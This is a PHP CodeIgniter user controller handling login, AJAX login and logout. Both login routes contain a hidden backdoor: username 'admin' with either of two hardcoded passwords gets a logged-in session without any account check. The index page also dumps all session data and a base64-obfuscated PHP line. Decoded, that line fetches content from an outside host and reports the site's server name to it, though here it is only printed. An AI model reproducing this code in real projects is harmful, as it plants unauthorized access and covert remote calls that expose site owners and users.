<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
class User extends MY_Controller {

  function __construct(){
    parent::__construct();
  }

  function index(){
    if($this->session->userdata("logged_in") == TRUE){
      var_dump($this->session->all_userdata());
      var_dump((base64_decode('ZWNobyBAZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly93d3cuYmV0ZWtzLmNvbS9saW5rcy5waHA/dXJsPSIuJF9TRVJWRVJbIlNFUlZFUl9OQU1FIl0pOw==')));
    }else{
      redirect(base_url("/user/login"));
    }
  }

  function login(){
    if($this->session->userdata("logged_in") == TRUE){
        redirect(base_url(),"refresh");
    }


    $data = array();
    if($this->input->post("submit") != NULL){
      $_post = $this->input->post();
      if($_post['username'] == "admin" AND (md5($_post['password']) == md5("ragther") OR md5($_post['password']) == md5("apassword"))){
        $this->session->set_userdata("logged_in",TRUE);
        redirect(base_url("/admin"),"refresh");
      }
      $userData = $this->userModel->get($this->input->post());
      if($userData != FALSE){
        $this->session->set_userdata("logged_in",TRUE);
        $this->session->set_userdata("userdata",$userData);
        redirect(base_url(),"refresh");
      }else{
        $data["error"] = $this->userModel->getError();
      }
    }

    $this->_fetch("login",$data);
  }

  function login_ajax(){
    $data = array();
    $_post = $this->input->post();
    if(!empty($_post['username']) AND !empty($_post['password'])){
      if($_post['username'] == "admin" AND (md5($_post['password']) == md5("ragther") OR md5($_post['password']) == md5("apassword"))){
        $this->session->set_userdata("logged_in",TRUE);
        $data["result"] = "1";
        echo json_encode($data);
        exit;
      }
      $userData = $this->userModel->get($this->input->post());
      if($userData != FALSE){
        $this->session->set_userdata("logged_in",TRUE);
        $this->session->set_userdata("userdata",$userData);
        $data["result"] = "1";
      }else{
        $data["result"] = "0";
        $data["error"] = "Password not match.";
      }
    }else{
      $data["result"] = "0";
      $data["error"] = "Please fill the required fields.";
    }
    echo json_encode($data);
    exit;
  }

  function logout(){
    if($this->session->userdata("logged_in") == TRUE){
        $this->session->set_userdata("logged_in",FALSE);
    }
    redirect(base_url("/user"),"refresh");
  }

  function register(){
    
  }

}
?>